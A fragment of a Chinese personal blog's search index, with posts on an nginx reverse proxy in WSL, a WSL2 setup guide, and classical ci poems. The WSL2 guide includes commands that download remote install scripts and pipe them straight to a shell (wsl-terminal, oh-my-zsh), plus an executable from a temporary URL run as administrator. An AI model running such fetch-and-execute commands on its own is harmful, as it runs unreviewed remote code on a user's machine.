    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>自从有了<code>WSL</code>，在Windows上部署各种服务也变得更加方便。最近，遇到一个问题，本地调试一些Web服务的时候，必须要使用<code>80</code>端口，如果同时有两个服务都监听<code>80</code>端口必然会导致冲突。而且，在<code>Linux</code>中监听<code>80</code>端口需要使用<code>root</code>权限，每次启动的时候都要加上<code>sudo</code>也挺麻烦的。</p>
<p>因此，想到可以利用<code>nginx</code>的反向代理能力，在本地进行HTTP的转发，这样，每个服务就可以使用自己的端口了。</p>
<h2 id="0x01-部署nginx"><a href="#0x01-部署nginx" class="headerlink" title="0x01 部署nginx"></a>0x01 部署nginx</h2><p>在<code>WSL</code>上部署nginx，和<code>Linux</code>下上是基本一致的。</p>
<p>我的<code>WSL</code>中安装的是<code>Ubuntu 18.04</code>，以下以该系统为例。</p>
<pre><code class="bash">$ apt install nginx -y
</code></pre>
<p>由于默认配置监听的是<code>0.0.0.0</code>地址，而我们只是本地使用，需要改成<code>127.0.0.1</code>。</p>
<p>修改<code>/etc/nginx/sites-available/default</code>文件中的<code>listen 80 default_server;</code>为<code>listen 127.0.0.1:80 default_server;</code>，并注释掉<code>listen [::]:80 default_server;</code>（不需要开启ipv6）。</p>
<p>启动nginx服务：</p>
<pre><code class="bash">service nginx start
</code></pre>
<blockquote>
<p>注意：不能使用<code>systemctl</code>命令。</p>
</blockquote>
<h2 id="0x02-添加反向代理配置"><a href="#0x02-添加反向代理配置" class="headerlink" title="0x02 添加反向代理配置"></a>0x02 添加反向代理配置</h2><p>在<code>/etc/nginx/conf.d</code>目录中添加一个配置文件<code>service.conf</code>，内容如下：</p>
<pre><code class="conf">##
# You should look at the following URL&#39;s in order to grasp a solid understanding
# of Nginx configuration files in order to fully unleash the power of Nginx.
# https://www.nginx.com/resources/wiki/start/
# https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
# https://wiki.debian.org/Nginx/DirectoryStructure
#
# In most cases, administrators will remove this file from sites-enabled/ and
# leave it as reference inside of sites-available where it will continue to be
# updated by the nginx packaging team.
#
# This file will automatically load configuration files provided by other
# applications, such as Drupal or Wordpress. These applications will be made
# available underneath a path with that package name, such as /drupal8.
#
# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
##

# Default server configuration
#
server {
    listen 127.0.0.1:80;
    # listen [::]:80 default_server;

    # SSL configuration
    #
    # listen 443 ssl default_server;
    # listen [::]:443 ssl default_server;
    #
    # Note: You should disable gzip for SSL traffic.
    # See: https://bugs.debian.org/773332
    #
    # Read up on ssl_ciphers to ensure a secure configuration.
    # See: https://bugs.debian.org/765782
    #
    # Self signed certs generated by the ssl-cert package
    # Don&#39;t use them in a production server!
    #
    # include snippets/snakeoil.conf;

    root /var/www/html;

    # Add index.php to the list if you are using PHP
    index index.html index.htm index.nginx-debian.html;

    server_name service.com; # 此处替换为对应服务的域名，可以通过配置hosts文件来指向127.0.0.1

    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host               $host;
        proxy_set_header X-Real-IP          $remote_addr;
        proxy_set_header X-Forwarded-For    $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto  $scheme;
     }

    # pass PHP scripts to FastCGI server
    #
    #location ~ \.php$ {
    #    include snippets/fastcgi-php.conf;
    #
    #    # With php-fpm (or other unix sockets):
    #    fastcgi_pass unix:/var/run/php/php7.0-fpm.sock;
    #    # With php-cgi (or other tcp sockets):
    #    fastcgi_pass 127.0.0.1:9000;
    #}

    # deny access to .htaccess files, if Apache&#39;s document root
    # concurs with nginx&#39;s one
    #
    #location ~ /\.ht {
    #    deny all;
    #}

}

</code></pre>
<p>每个服务添加一个对应的<code>.conf</code>文件，然后重新加载nginx服务：</p>
<pre><code class="bash">$ service nginx reload
</code></pre>
<h2 id="0x03-nginx常用配置方法"><a href="#0x03-nginx常用配置方法" class="headerlink" title="0x03 nginx常用配置方法"></a>0x03 nginx常用配置方法</h2><pre><code>    location /api/ {
        proxy_pass http://127.0.0.1:8000;
     }
</code></pre><p>这种方法表示转发整个路径，如：<code>/api/test/</code>会转发到<code>http://127.0.0.1:8000/api/test/</code></p>
<pre><code>    location /api/ {
        proxy_pass http://127.0.0.1:8000/;
     }
</code></pre><p>这种方法表示转发<code>/api/</code>后的路径，如：<code>/api/test/</code>会转发到<code>http://127.0.0.1:8000/test/</code></p>
<pre><code>location = / {
}
</code></pre><p>这种表示完全匹配，具有最高优先级</p>
<pre><code>location ^~ /images/ {
}
</code></pre><p>这种表示匹配所有以<code>/images/</code>开头的url，优先级仅次于<code>=</code></p>
<pre><code>location ~*.(gif|jpg|jpeg)$ {
}
</code></pre><p>使用正则方式匹配，这里表示所有以<code>gif</code>、<code>jpg</code>、<code>jpeg</code>结尾的请求</p>
<pre><code>location / {
}
</code></pre><p>匹配任意请求，优先级最低</p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p><code>WSL</code>极大简化了在Windows上部署各种服务的流程，同时，也可以学习Linux上的常用操作，可谓一举两得。</p>
<p>自从有了<code>WSL</code>，Windows也变得从未如此友好！</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>WSL</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL2入坑指北</title>
    <url>/2020/07/27/wsl2-guide/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>随着Win10 2004版本的发布，WSL2的时代也正式到来。使用过WSL的用户，都遇到过一些很不爽的问题，例如：不能直接使用docker，一些系统相关的函数不能调用，netstat命令不能使用等。这些问题在WSL2中都得到了解决，因此，是时候切换到WSL2了。</p>
<p>不过，WSL2不是万能的，依然有一些问题，甚至有些问题本来在WSL1的时代是不存在的。</p>
<h2 id="0x01-安装WSL2"><a href="#0x01-安装WSL2" class="headerlink" title="0x01 安装WSL2"></a>0x01 安装WSL2</h2><h3 id="升级系统"><a href="#升级系统" class="headerlink" title="升级系统"></a>升级系统</h3><p>如果系统版本不是2004，需要先升级系统。</p>
<p>可以使用微软官方提供的升级工具<a href="https://www.microsoft.com/zh-cn/software-download/windows10" target="_blank" rel="noopener"><code>微软 Windows 10 易升</code></a>。</p>
<h3 id="安装WSL2"><a href="#安装WSL2" class="headerlink" title="安装WSL2"></a>安装WSL2</h3><p>安装WSL2可以参考微软的<a href="https://docs.microsoft.com/zh-cn/windows/wsl/install-win10" target="_blank" rel="noopener">官方文档</a>。</p>
<p>如果想离线下载Linux镜像，可以参考<a href="https://docs.microsoft.com/en-us/windows/wsl/install-manual#download-using-powershell" target="_blank" rel="noopener">文档</a>。</p>
<h3 id="访问Linux文件系统"><a href="#访问Linux文件系统" class="headerlink" title="访问Linux文件系统"></a>访问Linux文件系统</h3><p>WSL1中Linux系统文件是直接以文件形式存储的，而在WSL2中则是一个<code>Hyper-V</code>格式的虚拟硬盘文件<code>ext4.vhdx</code>。</p>
<p>在Windows中可以使用<code>\\wsl$</code>路径来访问该文件系统。</p>
<h3 id="安装终端命令行工具"><a href="#安装终端命令行工具" class="headerlink" title="安装终端命令行工具"></a>安装终端命令行工具</h3><p>WSL默认提供的终端命令行工具过于简陋，虽然后来又提供了<code>Windows Terminal</code>，但我不是很喜欢它的风格。</p>
<p>所以我一般使用<a href="https://github.com/mskyaxl/wsl-terminal" target="_blank" rel="noopener">wsl-terminal</a>。</p>
<p>在WSL中进入要安装的路径，然后执行<code>bash -c &quot;$(wget https://raw.githubusercontent.com/mskyaxl/wsl-terminal/master/scripts/install.sh -qO -)&quot;</code>命令。</p>
<p>执行<code>tools/1-add-open-wsl-terminal-here-menu.js</code>脚本可以将<code>wsl-terminal</code>添加到右键菜单中，方便打开终端。</p>
<h2 id="0x02-配置Linux系统"><a href="#0x02-配置Linux系统" class="headerlink" title="0x02 配置Linux系统"></a>0x02 配置Linux系统</h2><h3 id="安装oh-my-zsh"><a href="#安装oh-my-zsh" class="headerlink" title="安装oh-my-zsh"></a>安装oh-my-zsh</h3><p>首先安装<code>zsh</code></p>
<pre><code class="bash">$ apt install -y zsh # Ubuntu
$ yum install -y zsh # Centos
</code></pre>
<p>接着安装oh-my-zsh</p>
<pre><code class="bash">$ wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O - | sh
</code></pre>
<p>设置<code>zsh</code>为默认shell</p>
<pre><code class="bash">$ chsh -s /bin/zsh root
</code></pre>
<p>修改主题</p>
<p>配置文件路径为<code>~/.zshrc</code>，将该文件中的<code>ZSH_THEME=&quot;robbyrussel&quot;</code>修改为<code>ZSH_THEME=&quot;agnoster&quot;</code>。<br>重启shell或执行<code>source ~/.zshrc</code>配置生效。</p>
<h3 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h3><p>WSL2中安装和使用Docker基本与普通的Linux系统一致，但主要有以下几点区别：</p>
<ul>
<li>只能使用<code>service</code>命令操作服务，如：<code>service docker start</code></li>
</ul>
<p>网上虽然也有人提供了可以工作的<code>systemd</code>方式，但是并没有执行成功</p>
<ul>
<li>修改代理需要通过在文件<code>/etc/init.d/docker</code>开头添加以下内容</li>
</ul>
<pre><code>export HTTP_PROXY=http://web-proxy.com:8080
export HTTPS_PROXY=http://web-proxy.com:8080
export NO_PROXY=internal.com
</code></pre><h2 id="0x03-WSL2的坑"><a href="#0x03-WSL2的坑" class="headerlink" title="0x03 WSL2的坑"></a>0x03 WSL2的坑</h2><h3 id="任务管理器无法看到进程"><a href="#任务管理器无法看到进程" class="headerlink" title="任务管理器无法看到进程"></a>任务管理器无法看到进程</h3><p>WSL1可以在任务管理器中看到内部的每个进程，但是WSL2是不行的，只能看到一个<code>vmmem</code>进程，想要看具体的进程状态，只能在WSL里看。</p>
<h3 id="网络互通"><a href="#网络互通" class="headerlink" title="网络互通"></a>网络互通</h3><p>由于WSL2使用的是虚拟机方案，因此它有自己的ip地址，而不是像WSL1那样与Windows使用相同的ip地址。</p>
<p>这样带来的问题就是：WSL2与Windows的网络互通性存在一定问题。</p>
<p>例如：Windows上创建的<code>127.0.0.1:8080</code>服务，在WSL里是不能通过<code>127.0.0.1:8080</code>访问的，毕竟在两个系统里<code>127.0.0.1</code>代表的是不同系统。</p>
<p>不过，幸运的是，在WSL里创建的<code>127.0.0.1:8080</code>服务，倒是可以在Windows里通过<code>127.0.0.1:8080</code>访问的。</p>
<p>关于这个问题，github上也有专门的<a href="https://github.com/microsoft/WSL/issues/4619" target="_blank" rel="noopener">issue</a>在讨论，不过看起来官方并没有准备修复这个问题。</p>
<h3 id="与Proxifier冲突"><a href="#与Proxifier冲突" class="headerlink" title="与Proxifier冲突"></a>与Proxifier冲突</h3><p>安装WSL2后，执行Proxifier会报错：</p>
<p><img src="/images/wsl2-proxifier-winsock-error.png" alt="WinSock Error"></p>
<p>点击<code>Yes</code>修复之后，WSL又无法工作了，会报<code>参考的对象类型不支持尝试的操作</code>错误，网上提供的修复方法为：</p>
<pre><code class="cmd">&gt; netsh winsock reset
</code></pre>
<p>但是这样操作之后，Proxifier又出问题了。这里似乎陷入了死循环，还好网上提供了终极解决方案：</p>
<p>使用工具<code>http://www.proxifier.com/tmp/Test20200228/NoLsp.exe</code>以管理员权限执行以下命令可以修复WSL：</p>
<pre><code class="cmd">&gt; NoLsp.exe C:\windows\system32\wsl.exe
</code></pre>
<p>此时<code>wsl-terminal</code>还是不能正常工作，打开后会立即闪退，可以使用<code>NoLsp.exe</code>修复一下<code>wsl-terminal</code>安装目录下的<code>bin\wslbridge2.exe</code>文件即可。</p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>WSL2解决了很多WSL1无法解决的问题，但是也带来了一些新的问题，这些问题基本上都是由于虚拟化导致的。而能否解决这些问题，则决定了WSL与虚拟机的差异。也就是说，这些问题不解决好，WSL就无法带来更加优异的原生体验。而且，相比WSL1，WSL2在性能上是有一定劣势的。</p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>wsl</tag>
      </tags>
  </entry>
  <entry>
    <title>西江月</title>
    <url>/2017/01/14/xi-jiang-yue/</url>
    <content><![CDATA[<pre><code>残灯孤风渐渐 冷夜思绪绵绵
寒蝉无语怎成眠 此情难寄鸿雁

但恨山高水远 今夕酒醒阳关
不知相诉欲何年 只消回眸一现
</code></pre>]]></content>
      <categories>
        <category>诗词</category>
      </categories>
  </entry>
  <entry>
    <title>惜奴娇</title>
    <url>/2017/01/14/xi-nu-jiao/</url>
    <content><![CDATA[<pre><code>邂逅佳人 拈萱草 轻启笑
赋痴情 鸾书恨少
偷眼相窥 此中意 伊难晓
渺渺 羡朝云 巫颠弄巧

孤雁高飞 缘已尽 情未了
欲释怀 相思怎扫
满目西风 尽凋敝 凄凉早
杳杳 似如今 愁肠断老
</code></pre>]]></content>
      <categories>
        <category>诗词</category>
      </categories>
  </entry>
  <entry>
    <title>御街行</title>
    <url>/2017/01/14/yu-jei-xing/</url>
    <content><![CDATA[<pre><code>横风漫扫清商路 思益切 归难阻  
愁云欲退月还明 忍痛徘徊寒幕  
昔年此处 流星划逝 相伴成双宿 

枯叶泪落惜缘舞 犹在盼 心头木  
重逢自此更无期 化作残灰稍驻  
来日芬馥 繁蕊若锦 勿忘枝间露 
</code></pre><p><img src="/images/yujiexing.jpg" alt></p>
]]></content>
      <categories>
        <category>诗词</category>
      </categories>
  </entry>
  <entry>
    <title>虞美人</title>
    <url>/2017/01/14/yu-mei-ren/</url>
    <content><![CDATA[<pre><code>天深海邃诸峰小 河汉兰舟杳
低眉思度会期遥 嗔怪七夕将至 愈难熬

粉壮素扮花前笑 问鹊桥未好
相拥无语苦全销 不记年年独卧 枕边潮
</code></pre>]]></content>
      <categories>
        <category>诗词</category>
      </categories>
  </entry>
  <entry>
    <title>昭君怨</title>
    <url>/2017/01/14/zhao-jun-yuan/</url>
    <content><![CDATA[<pre><code>风雨无情狂骤 吹煞杏桃红瘦
惊醒梦中秋 泪难收

晓看一塘残柳 花不语人依旧
空镜照人愁 粉颜流
</code></pre>]]></content>
      <categories>
        <category>诗词</category>
      </categories>
  </entry>
  <entry>
    <title>鹧鸪天</title>
    <url>/2017/01/14/zhe-gu-tian/</url>
    <content><![CDATA[<pre><code>不解西风离恨忧 欲将沧海泪还收
潇湘几度高唐梦 回首韩妻锁雀楼

枝上月 叹悠悠 相思何奈寸心休
纷纷落英含痴意 涛涛秋水势未留
</code></pre>]]></content>
      <categories>
        <category>诗词</category>
      </categories>
  </entry>
</search>
